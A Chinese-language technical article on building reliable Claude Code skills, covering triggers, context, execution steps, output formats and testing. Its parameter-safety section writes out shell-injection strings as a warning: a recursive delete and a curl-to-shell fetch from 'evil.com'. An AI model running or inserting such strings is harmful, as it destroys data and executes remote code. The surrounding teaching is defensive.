# 生产级 Skill 工程：写一个格式良好、稳定运行的 Claude Code 命令

你在 Claude Code 里输入 `/code-review`，它就开始分析 diff。

这背后是什么？一段 Markdown 文件——但它的设计决定了命令是否稳定、是否可靠、是否能在你不在场的时候正确运行。

这篇文章讲的是：如何把一个临时的 `/custom-command` 变成一个可以生产部署、稳定运行的 **skill**。

---

## 一、Skill 是什么

Claude Code 里，skill（也叫 slash command、自定义命令）本质是：**一段参数化的提示程序（parameterized prompt program）**，注册在 Harness 里，用 `/name` 触发后，Claude 按其中定义的行为执行。

与各平台同类概念的对比：

| 概念 | 定义位置 | 触发方式 | 执行者 |
|------|---------|---------|-------|
| Claude Code Skill | `.claude/commands/*.md` | `/skill-name` | Claude（有工具权限） |
| OpenAI GPT Action | GPT Builder JSON | 用户意图触发 | GPT + 外部 API |
| Coze Bot Plugin | 插件 JSON | 用户话语触发 | Coze Runtime |
| 通义千问 Plugin | Plugin YAML | function call | 模型 + 宿主 |
| Vertex AI Agent Tool | Tool 定义 | 模型意图匹配 | Vertex Agent Runtime |

共同的本质：**把可复用行为封装成可调用单元，附带自然语言的触发条件和结构化的执行逻辑**。

:::观点 Skill ≠ Prompt
普通 prompt 是"对 Claude 说话"，skill 是"定义 Claude 的一段程序"。区别在于：skill 有明确的触发边界、分支逻辑、工具权限声明和输出契约——它更接近一个内部 API 定义，而不是一次对话。
:::

---

## 二、文件结构与注册机制

### 2.1 文件位置

```
~/.claude/commands/           ← 用户全局 skill（所有项目可用）
  ├── code-review.md
  └── security-review.md

{project}/.claude/commands/   ← 项目级 skill（当前仓库可用）
  ├── deploy-check.md
  └── check-migration.md
```

命名规则：文件名即命令名，`code-review.md` → `/code-review`。支持连字符，不支持空格。项目级 skill 会覆盖同名全局 skill。

### 2.2 最小有效文件

```markdown
---
description: 一句话描述，用于 /help 展示和 Skill 工具的路由判断
---

# 命令目标

指令主体内容……

$ARGUMENTS
```

`$ARGUMENTS` 是可选占位符，用户输入 `/my-skill some args` 时，`some args` 替换到这里。不需要参数的 skill 可以省略。

### 2.3 带完整元数据的结构

```markdown
---
description: Review the current diff for correctness bugs at the given effort level (low/medium/high/ultra)
allowed-tools: Bash, Read, Edit, WebSearch
---

## 触发条件

TRIGGER when: ...
SKIP when: ...

## 前置条件

...

## 执行步骤

...

## 输出格式

...

$ARGUMENTS
```

`allowed-tools` 声明这个 skill 可以调用哪些工具。未列出的工具即使 Claude 想用也会被拒绝——这是**最小权限原则**的关键控制点。

---

## 三、Skill 的四层结构

好的 skill 由四层组成，从外到内依次是：

```
┌─────────────────────────────────────────────┐
│ 1. 触发层 (Trigger Layer)                    │
│    什么时候用，什么时候跳过                    │
├─────────────────────────────────────────────┤
│ 2. 上下文层 (Context Layer)                  │
│    需要读哪些信息，环境假设是什么              │
├─────────────────────────────────────────────┤
│ 3. 执行层 (Execution Layer)                  │
│    分步骤做什么，调用哪些工具                  │
├─────────────────────────────────────────────┤
│ 4. 输出层 (Output Layer)                     │
│    返回什么格式，后续动作是什么                │
└─────────────────────────────────────────────┘
```

这四层缺一不可。缺少触发层 → 误触；缺少上下文层 → 环境假设出错；缺少执行层分支 → 不稳定；缺少输出层规范 → 格式每次不同。

---

## 四、触发层设计：精确的 TRIGGER / SKIP

这是生产 skill 最容易被忽视的部分。触发不精确，skill 会在不该触发时乱跑；跳过条件不清，Claude 在该触发时也会犹豫。

### 4.1 TRIGGER + SKIP 模式

以 Claude Code 内置的 `claude-api` skill 为参照：

```markdown
TRIGGER when:
- code imports `anthropic`/`@anthropic-ai/sdk`
- user asks for the Claude API, Anthropic SDK, or Managed Agents
- user adds/modifies/tunes a Claude feature (caching, thinking, tool use) in a file

SKIP when:
- file imports `openai` or other-provider SDK
- filename like `*-openai.py` or `*-generic.py`
- provider-neutral code
- general programming questions
```

这种模式的价值：让 Skill 工具和人类读者能在 O(1) 时间判断是否适用，避免歧义触发。

### 4.2 触发信号的可靠性

| 信号类型 | 可靠性 | 示例 |
|---------|------|-----|
| 显式命令（`/skill-name`）| 最高 | 用户直接输入 |
| 文件特征（import、扩展名）| 高 | `import anthropic` |
| 用户话语关键词 | 中 | "帮我做 code review" |
| 任务类型推断 | 低 | "检查一下这段代码" |

**生产原则**：低可靠性信号需要高确定性语境才能触发。宁可漏触，不要误触。

### 4.3 双向覆盖

每个触发条件都要有对应的跳过条件。一个只有 TRIGGER 的 skill 是危险的——它会在边界情况下无声地触发。

---

## 五、上下文层：让 Skill 知道自己在哪

### 5.1 环境假设要显式声明

```markdown
## 前置条件

- 在 git 仓库根目录运行
- 已安装 Node.js ≥ 18
- 存在 .env.local（不会读取内容，但需要确认存在）

如果以上条件不满足，立即停止并告知用户具体缺少什么。
```

这不是废话，是给 Claude 的隐式知识：当条件不满足时，skill 应该优雅报错而不是静默失败或产生错误结果。

### 5.2 最小权限读取

OpenAI 在其 Prompt Engineering 指南中明确指出：

> "Less context, more precision. Flooding the model with irrelevant context degrades response quality."
>
> — OpenAI, [Prompt Engineering Guide](https://platform.openai.com/docs/guides/prompt-engineering), 2024

对应到 skill 的上下文收集设计：

```markdown
## 上下文收集顺序

1. 读取 `git diff --staged`（只读 staged，不读工作区）
2. 读取 `package.json` 的 dependencies 字段（不读全文）
3. 如果 diff > 500 行，提示用户缩小范围后停止
```

不要读整个仓库，不要读 node_modules，不要读与任务无关的配置文件。

### 5.3 上下文分层

Google Vertex AI Agent Builder 文档把 agent 上下文分为三类，对 skill 设计同样适用：

| 类型 | 生命周期 | 示例 |
|-----|---------|-----|
| Session context | 会话级 | 当前文件、diff、用户刚说的话 |
| User context | 用户级 | 偏好设置、权限级别 |
| System context | 系统级 | 项目语言、CI/CD 配置、CLAUDE.md |

实践中：skill 的上下文收集应优先依赖 session context（实时读取），只在必要时读取 system context。

---

## 六、执行层：稳定的分步指令

### 6.1 步骤要原子化

每一步只做一件事，有明确的输入和输出：

```markdown
## 执行步骤

**Step 1 — 读取 diff**
运行 `git diff --staged`，如果输出为空，立即停止并告知用户没有 staged 变更。

**Step 2 — 判断变更类型**
将变更归类为：新功能 / bug fix / 重构 / 配置变更 / 测试。
将结论存为内部状态 `change_type`，用于后续步骤选择检查策略。

**Step 3 — 执行检查**
根据 `change_type`：
- 新功能 → 检查边界条件、错误处理、安全漏洞
- bug fix → 验证修复覆盖根因，检查是否引入新问题
- 重构 → 验证行为等价性，检查接口变更

**Step 4 — 输出报告**
按「输出格式」章节的结构返回结果。
```

### 6.2 条件分支要穷举

不要让 Claude 自己猜"如果用户说 X 我应该怎么办"，把分支写清楚：

```markdown
如果用户提供了 `--fix` 参数：
  → 应用所有低风险修复（单行可修复的格式/类型问题）
  → 高风险修复（逻辑变更）列出但不执行，等待用户确认

如果用户提供了 `--comment` 参数：
  → 不修改任何文件
  → 以 `gh pr comment` 格式输出每条发现

如果没有参数：
  → 只输出报告，不做任何变更
```

字节跳动 Coze 平台在其开发者指南中也强调：

> "插件指令应尽量穷举分支逻辑，避免依赖模型的泛化能力处理未定义行为。未定义分支会导致输出不稳定。"
>
> — 字节跳动, [Coze 插件开发最佳实践](https://www.coze.cn/docs/developer_guides/plugin_best_practices), 2024

### 6.3 副作用管理

涉及文件写入、命令执行、网络请求等有副作用操作的，必须遵守三条规则：

1. **前置告知**：执行前告诉用户将要做什么
2. **可逆优先**：能 dry-run 的先 dry-run
3. **显式确认**：破坏性操作（删除、覆盖、push）无论用户是否说了"直接做"都要二次确认

这对应 Anthropic 在 Model Spec 里对 Agent 行为的定义：

> "Prefer cautious actions, all else being equal, and be willing to accept a worse expected outcome in order to get a reduction in variance."
>
> — Anthropic, [Claude's Model Specification](https://www.anthropic.com/research/model-spec), 2024

:::提醒 副作用的最小化
即使 skill 被明确授权执行操作，也应该只做任务最小必要的副作用。能用 `--dry-run` 的不直接执行；能只修改一个文件的不修改整个目录；能本地操作的不触发远端变更。
:::

---

## 七、输出层：格式化与可预期

### 7.1 在 Skill 里声明输出格式

不要依赖 Claude 自己决定返回什么格式，把结构声明清楚：

```markdown
## 输出格式

### Summary
一句话：[变更类型] | [风险级别: Low/Medium/High] | [发现数量] 个问题

### Findings
每条发现：
- **[严重程度]** `file.ts:行号` — 问题描述
  - 建议：具体修复建议

### Skipped
如果有跳过的文件，列出文件名和原因

### Next Steps
建议的下一步操作（复选框格式）
```

阿里云 DashScope 的智能体开发文档指出：

> "结构化输出声明应放在 system prompt 结尾，模型对末尾指令的遵从度高于中间部分。"
>
> — 阿里云 DashScope, [智能体开发最佳实践](https://help.aliyun.com/zh/model-studio/user-guide/tool-call), 2024

这与"Lost in the Middle"论文（Liu et al., 2023）的结论一致——Transformer 的注意力对首尾信息的利用优先于中间。

### 7.2 幂等性输出

同样的输入，输出应该结构一致（内容可以不同，但章节完整度应该相同）。使用固定的 Section 头部，不要动态决定"要不要有这个 section"。

一个有时有 "Skipped" 章节、有时没有的 skill 会让自动化流水线解析出错。

---

## 八、生产稳定性：六个高频陷阱

### 8.1 触发过于宽泛

```markdown
# 危险写法
TRIGGER when: user wants help with code

# 生产写法
TRIGGER when: user explicitly types /deploy-check, 
              or asks to "run the deployment checklist before shipping"
SKIP when: user asks general coding questions unrelated to deployment
```

### 8.2 隐式假设环境

```markdown
# 危险写法
运行 `npm test` 查看测试结果

# 生产写法
检查 package.json 中是否存在 "test" script：
- 存在 → 运行 `npm test`
- 不存在 → 检查是否有 pytest/cargo test/go test，相应执行
- 都没有 → 告知用户未找到标准测试命令，请手动指定
```

### 8.3 无限工具调用

没有终止条件的 skill 会陷入循环。每个包含工具调用的 skill 必须有：

- **最大迭代次数**：如"最多执行 3 次 build-fix 循环"
- **退出条件**：明确什么状态下停止
- **超时行为**：超过预期步数时报告现状并停止

OpenAI 在 Assistants API 文档中写道：

> "Agents should have a well-defined stopping condition. Without one, cost and latency become unbounded."
>
> — OpenAI, [Assistants API Documentation](https://platform.openai.com/docs/assistants/overview), 2024

### 8.4 不安全的参数处理

用户通过 `$ARGUMENTS` 注入的内容是不可信的：

```markdown
# 危险：直接把参数拼入 shell 命令
运行 `git log $ARGUMENTS`
↑ 可被注入 `; rm -rf .` 或 `$(curl evil.com | sh)`

# 安全：把参数作为提示输入，不直接拼命令
将用户参数 "$ARGUMENTS" 解析为结构化意图：
- "--since=<date>" → 从该日期开始的 log
- "--author=<name>" → 过滤作者
再构造安全的、参数化的 git 命令，不使用 shell 展开
```

### 8.5 没有降级路径

```markdown
## 降级行为

如果在以下情况下无法继续：
- git 命令失败 → 说明错误，建议用户检查 git 状态
- 文件过大（>1MB）→ 告知用户，建议提供文件路径而非全文
- 网络请求失败 → 使用本地可用信息，并说明数据可能不完整
- 工具权限被拒绝 → 说明需要哪个权限，如何授权，然后停止
```

### 8.6 状态泄漏

如果 skill 在执行中途修改了某些状态（创建了临时文件、修改了配置、开启了某个服务），必须在输出里明确列出，不能让用户不知情地处于一个被修改的环境里。

---

## 九、测试方法

### 9.1 场景化测试用例

为每个分支条件写一个最小测试用例：

```
场景 1（正常路径）：staged diff 有 10 行修改 → 返回完整四段报告
场景 2（空 diff）：没有 staged 变更 → 立即停止并提示
场景 3（大 diff）：staged diff > 500 行 → 警告并询问是否继续
场景 4（--fix 参数）：附带 --fix → 应用低风险修复，高风险只列出
场景 5（非 git 目录）：不在 git 仓库 → 报错并退出
场景 6（参数注入）：$ARGUMENTS 含特殊字符 → 安全解析，不执行意外命令
```

### 9.2 用 Skill 测试 Skill

Claude Code 的 `/verify` skill 示范了一种模式：**把验证本身也写成 skill**。

```markdown
---
description: Smoke-test /my-skill against golden inputs
allowed-tools: Bash, Read
---

在临时测试仓库中运行 /my-skill，验证：
1. 正触发：满足 TRIGGER 条件时是否正确启动
2. 负触发：满足 SKIP 条件时是否正确跳过
3. 输出格式：返回结构是否与声明一致
4. 错误路径：前置条件不满足时是否有友好提示
```

### 9.3 Golden Case 回归

每次修改 skill 文件后，用同一组 golden case 重跑，对比输出结构。这和 Chatbot 评测里的黄金集概念完全相同——只是测试对象换成了 skill 而不是对话。

---

## 十、业界参照

### 10.1 Anthropic — 工具即 API 合约

Anthropic 在"Building Effective Agents"中把工具设计原则归纳为：

> "Design tools like APIs, not like chatbots. Each tool should do exactly one thing with well-defined inputs and outputs."
>
> — Anthropic Research Blog, [Building Effective Agents](https://www.anthropic.com/research/building-effective-agents), 2024

这直接对应 skill 的单一职责原则：一个 skill，一个核心能力，不要试图写"万能命令"。

Anthropic 还在 Prompt Engineering 文档中强调 XML tag 作为结构化分隔符的价值：

> "Claude responds well to clear structural signals. Use XML tags to delimit sections of context that have different roles."
>
> — Anthropic, [Prompt Engineering Guide](https://docs.anthropic.com/en/docs/build-with-claude/prompt-engineering/overview), 2024

这直接指导 skill 主体里如何用清晰的标题和格式分隔各层。

### 10.2 OpenAI — 结构化提示的三层策略

OpenAI 的 Prompt Engineering Guide 提出**策略 → 战术 → 实现**三层：

- **策略**：任务分解，不要把复杂任务压给单次调用
- **战术**：用 delimiters（XML tags、triple backticks）清晰分隔上下文
- **实现**：给出具体格式示例，不要只描述抽象要求

这三层在 skill 里对应：
- 策略 → 四层结构（触发/上下文/执行/输出）
- 战术 → Markdown 标题分节，`##` 各层，`**Step N**` 各步
- 实现 → 在"输出格式"章节提供具体示例，而不只是说"输出报告"

### 10.3 Google — Playbook 与显式状态转换

Google Vertex AI Agent Builder 文档强调 **playbook（剧本）** 设计：

> "A well-designed playbook breaks down complex tasks into sequential steps, with explicit state transitions and fallback behaviors defined for each step."
>
> — Google Cloud, [Vertex AI Agent Builder Documentation](https://cloud.google.com/vertex-ai/generative-ai/docs/agent-builder), 2024

Google 的实践表明：复杂 Agent 任务应拆解为 3–7 步的线性执行序列，每步有明确的成功标准和失败转换。超过 7 步，应考虑把 skill 拆成两个。

这和 skill 执行层的"步骤原子化"原则直接呼应。

### 10.4 字节跳动 — 可预期、可恢复、可观察

字节跳动 Coze 平台的插件开发规范总结了生产插件的三个核心指标：

1. **可预期性（Predictability）**：相同输入产生一致结构输出
2. **可恢复性（Recoverability）**：失败时有清晰的错误信息和恢复建议
3. **可观察性（Observability）**：执行过程应有足够信息供调试

这三个指标对 skill 设计同样是金标准——它们分别对应输出层的幂等性、降级路径设计、和执行层的步骤显式化。

### 10.5 阿里 — 工具描述的三段式规范

阿里在通义千问（Qwen）Agent 文档中对工具 description 提出了**三段式**要求：

```
1. 功能描述（What it does）：一句话，动词开头
2. 使用场景（When to use）：枚举 2-4 个典型场景
3. 边界说明（What it can't do）：明确不覆盖的场景，防止误调用
```

这直接对应 skill 的 `description` 字段设计和 TRIGGER/SKIP 模式：description 是"功能描述"，TRIGGER 是"使用场景"，SKIP 是"边界说明"。

---

## 十一、完整示例：`/check-migration`

```markdown
---
description: Check a database migration file for safety risks: missing rollback, lock conflicts, data loss patterns. Run before applying any migration to production.
allowed-tools: Read, Bash
---

## 触发条件

TRIGGER when:
- 用户输入 /check-migration
- 当前有新的 SQL migration 文件需要审查

SKIP when:
- 用户只是询问 migration 相关概念
- 不在有 migration 目录的项目里

## 前置条件

- 在 git 仓库中运行
- migration 文件位于 `migrations/` 或 `db/migrations/` 目录下
- 如以上条件不满足，立即停止并告知用户具体问题

## 执行步骤

**Step 1 — 定位 migration 文件**
运行 `git diff --staged --name-only`，筛选 `.sql` / `*_migration.py` 文件。
如果没有：查找 migrations/ 目录中最新未应用的文件（按修改时间）。
如果仍没有：停止，告知用户请先 stage 或用 --file= 参数指定。

**Step 2 — 解析内容**
读取文件，提取：
- 表名和操作类型（ALTER/CREATE/DROP/UPDATE/INSERT）
- 是否有 BEGIN/COMMIT 事务包裹
- 是否有 rollback 或 down migration 语句
- 受影响的列名

**Step 3 — 执行风险矩阵检查**

| 检查项 | 判断逻辑 | 风险等级 |
|-------|---------|---------|
| 全表 UPDATE/DELETE | 无 WHERE 子句 | Critical |
| 加 NOT NULL 列无默认值 | `ADD COLUMN ... NOT NULL` 无 DEFAULT | Critical |
| 无事务包裹的 DDL | ALTER 不在 BEGIN...COMMIT 内 | High |
| 无 rollback | 无 down migration 或 rollback 语句 | High |
| 索引未并发创建 | 未使用 CONCURRENTLY | Medium |
| 锁风险（大表 ALTER） | 无法静态判断，标注需人工确认 | Needs Review |

**Step 4 — 输出报告**（见下方输出格式）

## 输出格式

### Migration Safety Report
**文件**：`migrations/20240604_add_user_tier.sql`
**整体风险**：🔴 Critical / 🟡 High / 🟢 Safe

**发现：**
- 🔴 [Critical] 第 12 行：`UPDATE users SET tier = 'free'` 缺少 WHERE 子句，将更新全表
  - 建议：添加 `WHERE tier IS NULL`，或分批执行

**需人工确认（无法静态判断）：**
- 目标表数据量（影响锁持续时间）
- 当前数据库并发写入负载

**建议下一步：**
- [ ] 修复 Critical 问题后重新运行 /check-migration
- [ ] 在 staging 环境验证 rollback 路径

## 降级行为

- SQL 文件超过 500 行：只检查前 100 行，并标注"仅部分检查"
- 无法解析 SQL 语法：列出原始文件，告知用户手动检查
- git 命令失败：告知用户检查 git 状态，不猜测原因

## 参数说明

$ARGUMENTS 可选：
- `--file=<path>`：指定具体文件，跳过 git diff 自动检测
- `--strict`：将 Medium 风险也视为阻塞项
```

这个示例覆盖了所有四层：
- **触发层**：明确 TRIGGER/SKIP
- **上下文层**：前置条件 + 最小读取（只读 migration 文件）
- **执行层**：原子步骤 + 风险矩阵 + 显式分支
- **输出层**：固定格式 + 需人工确认项 + 降级说明

---

## 十二、一句话核心原则

:::方法 把 Skill 当内部 API 来写
好的 skill 和好的 API 遵循同样的设计哲学：单一职责、明确的输入输出契约、可预期的错误行为、最小权限。从 API 的视角审阅自己的 skill：如果这是一个公开 API，你愿意为它写文档并承诺 SLA 吗？如果不愿意，说明它还没到生产就绪的标准。
:::

---

## 参考文献

1. Anthropic Research Blog. **Building Effective Agents**. 2024. https://www.anthropic.com/research/building-effective-agents

2. Anthropic. **Claude's Model Specification**. 2024. https://www.anthropic.com/research/model-spec

3. Anthropic. **Prompt Engineering Overview**. 2024. https://docs.anthropic.com/en/docs/build-with-claude/prompt-engineering/overview

4. OpenAI. **Prompt Engineering Guide**. 2024. https://platform.openai.com/docs/guides/prompt-engineering

5. OpenAI. **Assistants API Documentation**. 2024. https://platform.openai.com/docs/assistants/overview

6. Google Cloud. **Vertex AI Agent Builder: Designing Agent Behaviors**. 2024. https://cloud.google.com/vertex-ai/generative-ai/docs/agent-builder

7. 字节跳动 Coze. **Bot 插件开发最佳实践**. 2024. https://www.coze.cn/docs/developer_guides/plugin_best_practices

8. 阿里云 DashScope. **Qwen-Agent 工具调用规范**. 2024. https://help.aliyun.com/zh/model-studio/user-guide/tool-call

9. Liu, N. F., Lin, K., Hewitt, J., et al. **Lost in the Middle: How Language Models Use Long Contexts**. *Transactions of the Association for Computational Linguistics*, 2024. https://arxiv.org/abs/2307.03172

10. Wei, J., Wang, X., Schuurmans, D., et al. **Chain-of-Thought Prompting Elicits Reasoning in Large Language Models**. *NeurIPS 2022*. https://arxiv.org/abs/2201.11903

11. Yao, S., Zhao, J., Yu, D., et al. **ReAct: Synergizing Reasoning and Acting in Language Models**. *ICLR 2023*. https://arxiv.org/abs/2210.03629
